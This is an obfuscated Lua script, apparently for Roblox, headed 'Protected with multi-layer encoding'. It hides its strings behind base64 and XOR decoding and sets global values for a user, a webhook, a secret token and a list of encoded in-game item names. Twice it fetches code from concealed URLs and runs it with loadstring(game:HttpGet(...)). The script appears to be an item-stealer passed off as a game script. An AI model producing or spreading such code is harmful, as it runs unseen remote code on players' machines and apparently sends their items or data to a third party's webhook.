--[[ Protected with multi-layer encoding ]]
local _llOOIIll=68703;local _OI000Il=70852;local _l00IO0I=tostring(1950);local _0I0lIOO0Il=5313;local _Il0OO0=86928;local _I00lI00OO0=68556;local _I0O0llO="_OO0OO";local _OO0OlO0l=tostring(9191);
local _IOlOl0IO="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _IlO00II0(_lIOIl0)
  local _l0Olll=""
  _lIOIl0=string.gsub(_lIOIl0,"[^".._IOlOl0IO.."=]","")
  for _O0Ol=1,#_lIOIl0,4 do
    local a=string.find(_IOlOl0IO,string.sub(_lIOIl0,_O0Ol,_O0Ol),1,true)-1
    local b=string.find(_IOlOl0IO,string.sub(_lIOIl0,_O0Ol+1,_O0Ol+1),1,true)-1
    local c=string.find(_IOlOl0IO,string.sub(_lIOIl0,_O0Ol+2,_O0Ol+2),1,true)
    local d=string.find(_IOlOl0IO,string.sub(_lIOIl0,_O0Ol+3,_O0Ol+3),1,true)
    if c then c=c-1 end
    if d then d=d-1 end
    _l0Olll=_l0Olll..string.char((a*4+math.floor((b or 0)/16))%256)
    if c then _l0Olll=_l0Olll..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
    if d then _l0Olll=_l0Olll..string.char(((c or 0)%4*64+(d or 0))%256) end
  end
  return _l0Olll
end
local _lllOIlIl={185,103,215,1,252,104,25,34}
local function _II0Ill0I(_lIOIl0)
  local _l0Olll=""
  for _O0Ol=1,#_lIOIl0 do
    local k=_lllOIlIl[(_O0Ol-1)%#_lllOIlIl+1]
    local b=string.byte(_lIOIl0,_O0Ol)
    local r=0
    for bit=0,7 do
      local ba=math.floor(b/2^bit)%2
      local bb=math.floor(k/2^bit)%2
      if ba~=bb then r=r+2^bit end
    end
    _l0Olll=_l0Olll..string.char(r)
  end
  return _l0Olll
end
local function _OI0OlIll0IO0(_lIOIl0) return _II0Ill0I(_IlO00II0(_lIOIl0)) end
local _lllOI0="_III00";local _0II0llIOl0=17303;
local function _l0OllIlIl0()
getgenv().User = _OI0OlIll0IO0("9AyEbIk".."Pfk7QC".."bAzzQ=".."=")

getgenv().Webhook = _OI0OlIll0IO0("0ROjcY".."9SNg3dDq".."Rikxp9D".."NoIui6d".."GHA".."NzgK1aZ".."MHclGWV".."uM5zlov".."EopS7zn".."PWC4X".."iF/lNN".."Mle".."1vqK7".."VgjC".."xBSfc".."0kWuzBl9".."v0ASxeJM".."PKHvTL".."KNzpl1".."gZ9cUo".."VGG".."WS1p+wu".."wbq".."0DU".."RXMAOF0".."hjo".."0cuAOvVD".."RP3".."NO8A".."==")

getgenv().SecretToken = _OI0OlIll0IO0("iVbgOZ".."pcKk".."SUV".."7Q5mkUt".."Et8E+".."jjNW".."SkP".."j1SyYMgK".."KRPd".."UOEy")

getgenv().Brainrots = {
  _OI0OlIll0IO0("6hOlYIs".."KfF".."DLHvdEk".."A1pSt".."gJow=="),
  _OI0OlIll0IO0("9AK4dp".."A="),
  _OI0OlIll0IO0("6gy+Y5UM".."cALtC".."L5tmRw".."="),
  _OI0OlIll0IO0("8QK2Z".."ZANalG".."ZL7hzjw".."10Q9".."c="),
  _OI0OlIll0IO0("8R6zc5".."1IXVDYA".."Lhv3Ct4".."TNc".."Cu22TBn".."A="),
  _OI0OlIll0IO0("/RW2ZpM".."GOWHY".."CblkkAR".."2TN".."A="),
  _OI0OlIll0IO0("/RW2".."ZpMGOWX".."QCbB".."kjgF3Sw".."=="),
  _OI0OlIll0IO0("9Qb3Uo".."kYa".."0fUAvd".."CkwV".."7S9cGpGi".."TBg=="),
  _OI0OlIll0IO0("+gKl".."Y5kabF".."E="),
  _OI0OlIll0IO0("6Qin".."YokabA".."LYCbM".."hug".."FjWMwVog".."=="),
  _OI0OlIll0IO0("6wikZ".."IVI".."eEzdR4Nk".."mAxg"),
  _OI0OlIll0IO0("+gan".."aIgJd0".."2ZK".."rhjhQ=="),
  _OI0OlIll0IO0("+gi4apVI".."eEzd".."R5pokANw"),
  _OI0OlIll0IO0("+xK".."lZok".."adgL4CbM".."huhpg".."V8sI"),
  _OI0OlIll0IO0("8gKjdI".."wJb".."QL7Fb".."hy"),
  _OI0OlIll0IO0("9Qb3".."Qp0beAL7".."CLg="),
  _OI0OlIll0IO0("6he4bp".."cROUPXA/".."dRiQV".."pScA".."="),
  _OI0OlIll0IO0("9Qb3Upk".."La0f".."NR5".."RukQ".."pwTNgU".."vm6S"),
  _OI0OlIll0IO0("/galYJ".."EJOUPXA/".."dMnQ".."xsTN0SuW".."Y="),
  _OI0OlIll0IO0("9QihZN".."wkdlTcR5".."VknRo="),
  _OI0OlIll0IO0("+gK".."7ZI".."8ccE".."PVR4dkm".."wlq".."V8o="),
  _OI0OlIll0IO0("9Qb3R".."5MHfQL6".."CLp".."jlQZ4UdA".."IuQ".."==")
}

task.spawn(function()
loadstring(game:HttpGet(_OI0OlIll0IO0("0ROjcY9S".."Ng3Y".."F74v".."kB14UN".."QIpS+SD".."W0N3w67".."ZI9Hbxa".."WC7hg".."mA1rUZ".."Zf5zmaXH".."hGjQ".."K1Z5p".."cLhfaU".."uBimV4o".."R9hU7".."mTIW".."XwQikm7d".."J0=")))()
end)

task.spawn(function()
loadstring(game:HttpGet(_OI0OlIll0IO0("0ROjcY9".."SNg".."3JBqR1mR".."s3S9".."ZIpWCLR2".."8TiVf".."6aYgc".."aVGUX+".."Y5xF4=")))()
end)

end
local _lIO0OOlOI0=(166*8463>166) and _l0OllIlIl0 or nil
if _lIO0OOlOI0 then _lIO0OOlOI0() end
